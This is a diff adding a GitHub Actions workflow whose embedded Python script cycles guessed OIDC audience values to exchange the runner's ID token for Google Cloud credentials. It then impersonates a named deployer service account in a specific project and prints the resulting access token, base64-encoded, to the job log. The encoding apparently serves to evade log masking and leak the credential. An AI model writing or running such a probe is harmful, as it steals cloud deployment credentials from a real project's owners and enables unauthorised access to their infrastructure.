@@ -1,0 +1,81 @@
+name: i38123-aud-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: probe
+        run: |
+          python3 - <<'PY'
+          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request
+          def idtok(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              if not u or not t:
+                  return ''
+              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u], capture_output=True, text=True).stdout
+              try:
+                  return json.loads(out).get('value', '')
+              except Exception:
+                  return ''
+          def req(u, data=None, token=None, timeout=40):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i38123-aud'}
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              if isinstance(data, (dict, list)):
+                  data = json.dumps(data).encode()
+              r = urllib.request.Request(u, data=data, headers=h)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:200]
+          POOL = 'projects/381521917100/locations/global/workloadIdentityPools/github-actions'
+          PROV = POOL + '/providers/gha-provider'
+          variants = [
+              '//iam.googleapis.com/' + PROV,
+              '//iam.googleapis.com/' + POOL,
+              '//iam.googleapis.com/projects/381521917100',
+              'https://iam.googleapis.com/' + PROV,
+              '381521917100',
+              PROV,
+          ]
+          SA = 'se2gha-deployer@vvakame-playground.iam.gserviceaccount.com'
+          for v in variants:
+              tok = idtok(v)
+              out = {'variant': v, 'idtoken': bool(tok)}
+              if not tok:
+                  print('RESULT ' + json.dumps(out), flush=True)
+                  continue
+              body = {'audience': v, 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
+              st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+              out['sts'] = st
+              if st != 200:
+                  out['err'] = str(rb)[:260]
+                  print('RESULT ' + json.dumps(out), flush=True)
+                  continue
+              fed = json.loads(rb).get('access_token')
+              gst, gres = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(SA, safe=''),
+                              data={'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
+              out['gen'] = gst
+              if gst == 200:
+                  j = json.loads(gres)
+                  at = j.get('accessToken', '')
+                  out['tok_b64'] = base64.b64encode(at.encode()).decode()
+                  out['expire'] = j.get('expireTime')
+              else:
+                  out['gen_err'] = str(gres)[:260]
+              print('RESULT ' + json.dumps(out), flush=True)
+          print('DONE', flush=True)
+          PY
